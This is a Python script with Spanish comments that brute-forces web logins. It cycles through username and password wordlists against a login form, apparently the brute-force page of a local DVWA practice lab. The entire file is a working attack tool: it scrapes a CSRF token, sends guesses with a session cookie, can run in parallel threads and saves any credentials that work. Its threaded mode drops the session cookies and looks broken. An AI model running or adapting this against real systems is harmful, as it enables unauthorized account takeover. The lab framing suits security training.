#!/usr/bin/env python3
"""
Ejemplo de uso:
python3 archivo.py --users /home/natalia/usuarios.txt \
    --pwds /home/natalia/Pwdb_top-1000.txt \
    --host 127.0.0.1 --port 8000 \
    --php-session nig1vghftn8f1nhbe3tk61knv7 \
    --delay 0.02 --workers 1 --out resultados.txt
"""
import argparse
import requests
import time
import re
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

SUCCESS_SIG = "Welcome to the password protected area"

def parse_args():
    p = argparse.ArgumentParser()
    p.add_argument("--users", required=True, help="ruta archivo usuarios (uno por linea)")
    p.add_argument("--pwds", required=True, help="ruta archivo contraseñas (uno por linea)")
    p.add_argument("--host", default="127.0.0.1", help="host (por defecto 127.0.0.1)")
    p.add_argument("--port", default=8000, type=int, help="puerto (por defecto 8000)")
    p.add_argument("--php-session", required=True, help="valor de PHPSESSID (ej: nig1vghftn8f1nhbe3tk61knv7)")
    p.add_argument("--delay", default=0.0, type=float, help="retraso entre intentos en segundos")
    p.add_argument("--workers", default=1, type=int, help="numero de hilos (>=1). Si pones >1, cuidado con bloqueos")
    p.add_argument("--out", default=None, help="archivo donde guardar combinaciones exitosas")
    return p.parse_args()

def load_lines(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def get_csrf_token(session, base_url):
    try:
        r = session.get(base_url, timeout=10)
    except Exception:
        return None
    m = re.search(r'name=["\']user_token["\']\s+value=["\']([^"\']+)["\']', r.text)
    if m:
        return m.group(1)
    m2 = re.search(r'<input[^>]*name=["\']user_token["\'][^>]*>', r.text)
    return None

def attempt_login(session, base_url, username, password, user_token=None):
    params = {
        "username": username,
        "password": password,
        "Login": "Login"
    }
    if user_token:
        params["user_token"] = user_token
    try:
        r = session.get(base_url, params=params, allow_redirects=True, timeout=10)
    except requests.RequestException as e:
        return (False, None, f"ERR:{e}")
    text = r.text or ""
    ok = SUCCESS_SIG in text
    return (ok, r.status_code, text[:400])

def worker_task(session, base_url, user, pwd_list, delay, user_token, out_file=None):
    found = []
    for pwd in pwd_list:
        ok, status, snippet = attempt_login(session, base_url, user, pwd, user_token=user_token)
        if ok:
            found.append((user, pwd))
            if out_file:
                with open(out_file, "a", encoding="utf-8") as f:
                    f.write(f"{user}:{pwd}\n")
            break
        time.sleep(delay)
    return found

def main():
    args = parse_args()
    users = load_lines(args.users)
    pwds = load_lines(args.pwds)
    base = f"http://{args.host}:{args.port}/vulnerabilities/brute/"

    
    session = requests.Session()
    session.cookies.update({
        "PHPSESSID": args.php_session,
        "security": "low"
    })
    session.headers.update({"User-Agent": "Mozilla/5.0 (X11)"})

    # Intentar extraer token CSRF si existe
    user_token = get_csrf_token(session, base)
    if user_token:
        print(f"[+] token CSRF detectado: {user_token!r} -> será incluido en cada intento")
    else:
        print("[*] No se detectó token CSRF (se intentará sin token)")

    print(f"[+] Empezando ataques: usuarios={len(users)} contraseñas={len(pwds)} workers={args.workers}")
    results = []

    if args.workers <= 1:
        
        for u in users:
            for p in pwds:
                ok, status, snippet = attempt_login(session, base, u, p, user_token=user_token)
                print(f"try {u}:{p} -> status={status} {'SUCCESS' if ok else ''}")
                if ok:
                    results.append((u, p))
                    if args.out:
                        with open(args.out, "a", encoding="utf-8") as f:
                            f.write(f"{u}:{p}\n")
                time.sleep(args.delay)
    else:
        with ThreadPoolExecutor(max_workers=args.workers) as exe:
            futures = {exe.submit(worker_task, requests.Session(), base, u, pwds, args.delay, user_token, args.out): u for u in users}
            for fut in as_completed(futures):
                u = futures[fut]
                try:
                    found = fut.result()
                except Exception as e:
                    print(f"[!] Error en worker {u}: {e}")
                    continue
                for (uu, pp) in found:
                    print(f"[+] Encontrado: {uu}:{pp}")
                    results.append((uu, pp))

    if results:
        print("\n== RESULTADOS ENCONTRADOS ==")
        for u,p in results:
            print(f"{u}:{p}")
    else:
        print("\n[-] No se encontraron credenciales con las listas provistas.")

if __name__ == "__main__":
    main()

